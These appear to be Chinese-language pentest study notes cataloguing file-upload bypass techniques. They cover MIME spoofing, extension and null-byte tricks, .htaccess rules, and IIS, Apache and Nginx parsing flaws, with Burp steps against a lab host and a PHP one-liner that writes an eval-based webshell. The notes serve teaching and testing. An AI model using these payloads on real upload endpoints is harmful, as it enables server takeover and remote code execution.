```
文件上传高危触发点

    相册、头像
    视频、照片
    附件上传
    文件管理器
    备份功能
1、禁用JS类型绕过漏洞   
    特点：图片在前台进行校验
    过程：
    1、关闭JS解析   火狐浏览器，自带禁用JS插件，页面红色的JS标记
    2、在白名单中加上允许上传的格式    右击修改html，添加上传格式，然后点击 编辑  进行保存
    3、破坏JS
    4、拦包并修改
    修改建议：
    1.客户端检测，使用JS对上传图片检测，包括文件大小、文件扩展名、文件类型等
    2.服务端检测，对文件大小、文件路径、文件扩展名、文件类型、文件内容检测，对文件重命名
    3.其他限制，服务器端上传目录设置不可执行权限
2、MIME类型绕过漏洞
    特点：通过Content-Type进行格式校验
    过程：
    1、burp suite抓包
    2、修改Content-Type: text/plain为
        Content-Type: image/pjpeg
        Content-Type: image/jpeg
        Content-Type: image/png
        Content-Type: image/jpg
3、文件扩展名绕过漏洞
	特点：当文件上传针对.php文件进行过滤时，可以尝试改为php2、php3、php4 、php5、html进行上传解析。
	过程：将php改为其他后缀
4、windows特性，绕过黑名单检测
    test.asp. 或 test.asp_(下划线为空格)，这种命名方式
    在windows系统里是不被允许的，所以需要在 burp之类里进行修改，然后绕过验证后，会
    被windows系统自动去掉后面的点和空格，但要注意Unix/Linux系统没有这个特性。
5、空字节截断目录路径检测绕过类上传漏洞（php版本小于5.3.4）
    特点：通过00截断，阻断对后缀的解析
    过程：
    POST方式   需要在upload/1.php后加%00。 1.php%00
    GET方式如下，需要变为16进制
    1、将一句话木马改为 .jpg文件 
    2、利用burp suite进行抓包
    3、找到上传后的保存路径  // 如upload/
    4、在上传地址后输入，1.php .jpg     //1.php[空格].jpg
    5、转到Hex,进入数据包二进制模式，找到1.php[空格].jpg地址。    
    6、[空格]二进制解析为20，将20修改为00
    	选中后，ctrl+shift+u，自动转成16进制
6、通过修改解析规则，绕过黑名单检测
	修改大小写：AsP， pHp
	绕过黑名单：asa或cer
7、htaccess文件上传解析漏洞
    创建.htaccess文件，添加内容允许，.jpg解析为php
    AddType application/x-httpd-php .jpg
    1、将带有上述代码的.htaccess文件进行上传
    2、将木马改为.jpg然后进行上传
    3、最终地址为http://192.168.10.139/muma.jpg
8、windows php叠加特性和常见方法   第4关
	1.php.
	1.php::$DATA
	1.php. . （点+空格+点）
	1.phphpp
	copy 1.jpg /b + shell.php /a webshell.jpg //原图片+php文件=后图片
	添加文件头（需要进行编码Encoding - Hex Decoding - Hex to Characters）
	
    " = .
    > = ?
    < = *
    第一步 往服务器写入 ok文件 shell.php  
    第二步 修改文件名未shell.>>> >>>与php相等   shell.< 只需要一个

    文件内容检测(文件头、魔术头) WinHex
9、图片渲染检测	
	利用GIMP对图片进行注入代码
	渲染检测绕过，需要与包含、解析漏洞结合使用
	针对加载器的攻击（溢出）
	
	
	
    晚上找图片马
    linux生成图片马
    iis 6
    iis 7
    nginx 
    tomcat
```

### 4、文件内容检测绕过类上传漏洞

```
过程：
1、上传正常文件，并通过burp suite进行抓包
2、将一句话木马插入burp suite拦截包中
3、将图片后缀改为php
4、放行
```

### 6、目录路径检测解析绕过上传漏洞

```
特点：适用于IIS6.0解析漏洞，在解析到1.asp后/（反斜杠时，会进行截断）muma.jpg不再被解析
过程：
1、正常上传muma.asp类型一句话木马
2、利用burp suite进行抓包
3、找到上传后的保存路径   //如upload/
4、在保存路径后添加1.asp/    //最后保存的路径为upload/1.asp
5、将原有muma.asp改名为muma.jpg
6、最后访问的地址为：http://192.168.10.139/upload/1.asp/muma.jpg
```

### 7、IIS6.0解析缺陷绕过上传漏洞

```
特点：适用于IIS6.0
原理：iis6.0从左往右读取文件名，当遇到；分号后，会产生内存截断，分号后内容会被截断掉
支持格式：a.asa a.cer a.cdx
1、正常上传muma.asp类型一句话木马
2、利用burp suite进行抓包
3、找到上传后的保存路径   //如upload/
4、在保存路径后添加upload/1.asp；  //分号
5、将muma.asp改名为muma.jpg     //木马.jpg会重命名为带有时间戳的文件名 1412790008.jpg
6、上传
7、最终地址为：http://192.168.10.139/upload/1.asp;1412790008.jpg   //url为连接菜刀的完整地址
```

8、Apache解析缺陷绕过上传漏洞

```
特点：忽略最后一个无法解析的格式，自动解析前面格式
1、如允许上传.7z格式文件，但并未对.7z进行解析
2、将muma.php改为muma.php.7z
3、最终地址为：http://192.168.10.139/muma.php.7z   //连接菜刀，必须加http
或者
a.php.a;.jpg   //apache
```

10、FCK编辑器上传漏洞

```
FCK2.6.6
1、利用iis解析漏洞，创建1.asp文件夹，然后上传图片马
2、fck会把.解析成下划线
3、将muma.asp改为muma.jpg,进行上传
FCK2.4.2
与2.6.6方法相同
```

11、IIS 7.0/IIS 7.5 Nginx <8.03解析漏洞

```
a.php.jpg      //nginx
a.php;.jpg    //2003
```



```
解析漏洞
	IIS 5.x-6.x(服务器本身漏洞)
		目录解析漏洞 以asp/asa等解析的目录，其目录下的文件均可以解析  /1.asp/xx.jpg
		文件名解析漏洞 以1.asp;.jpg   1.asa;.jpg等结尾均会被解析
		其他可解析目录	1.asa  1.cer 1.cdx也可以被解析
	IIS 7.5（配置不当引起）
		a.aspx.a;.a.aspx.jpg..jpg	
	Apache		
		Apache在解析文件过程中，从右向左解析,遇到不认识后缀名，向左继续判断 test.php.php123
       （服务器本身漏洞）
    Apache（配置不当引起）
		配置文件加入addhandler php5-script.php,只要包含php,均可被解析test2.php.jpg 				配置文件加入addtype application/x-httpd-php .jpg  只要是jpg格式，均可解析为php
	Nginx < 8.0.3 
		空字节代码执行漏洞     1.jpg%00.php
    Nginx（配置不当引起）开启fix_pathinfo参数  
    	/1.jpg/1.php    //直接用上传1.jpg，然后访问/1.jpg/1.php
    	/1.jpg%00.php
    	/1.jpg/%20\0.php
		a.php.a;.jpg	
		
	<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
```

















